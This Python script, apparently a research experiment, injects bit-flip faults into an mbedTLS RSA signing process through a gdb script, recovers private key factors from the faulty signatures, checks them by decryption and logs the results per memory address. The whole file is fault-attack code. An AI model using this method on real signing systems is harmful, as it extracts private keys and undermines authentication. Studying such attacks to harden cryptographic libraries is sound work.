import csv
import mbedtls_utils2 as mu
import os
import subprocess

all_data = []

m = int("0001ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff003031300d0609608648016503040201050004207e6bb673f061cfd23cba009e648143fb07ac77dcd1681f6a9af9d5fe7c0f7f4b", 16)
sigfile = "example.txt.sig"
keyfile = "rsa_pub.txt"
n = (mu.read_pub_keys(keyfile))[0]
e = (mu.read_pub_keys(keyfile))[1]

encrypted = mu.read_file("result-enc.txt")
correct_decrypted = int("00029c1067d5eb8e0a306c926cef12043e1d0ed40b137488772c42f35a798c557f086a93b3f90324b2d8c4c0727e3cc6645c550786b1c271a9b03a63c387753a2e5627bf220b184045ee9a14c34ce342215b3d2550a567830c3ffbe008a61b4583d1d8c14f8c88816c6911675ca73da5691a0f46c5561f7632bc338da3f759563dc640a2113fb6e07147a54f2aefc795f3e3a37eb72693c716ad5b1ac0937b08b11d8aad78c7bf24ec03e927d7c43f3bb116870cfc3eb7612c02c437eba0c0ae5b6cccc76ee88ac9a0c11b71ff2ca932e48c25877fbeb37b46ab8b7b6935786dbeb1f9efc022425a95a2b973e861482c896e006b65795f636865636b2e747874", 16)

for i in range(0x40d27b, 0x40d4b1):
	subprocess.call(["./gdb_flip.sh", str(i)])
	i_data = {}
	i_data['Memory Address'] = hex(i)
	s = mu.read_file(sigfile)
	if not(s == "failed"):
		pkeys = mu.solve_private_keys(e, s, m, n)
		i_data['Private Keys'] = pkeys
		os.remove(sigfile)
		# try to decrypt some message so you know whether the private keys are correct
		decrypted = mu.decrypt(pkeys[0], pkeys[1], e, n, encrypted)
		i_data['Correct?'] = mu.check_private_keys(correct_decrypted, decrypted)
	else:
		i_data['Private Keys'] = "failed"

	all_data.append(i_data)

fields = ['Memory Address', 'Private Keys', 'Correct?']
with open('results_mbedtls_2.csv', 'wb') as f:
    writer = csv.DictWriter(f, fieldnames = fields)
    writer.writeheader()
    writer.writerows(all_data)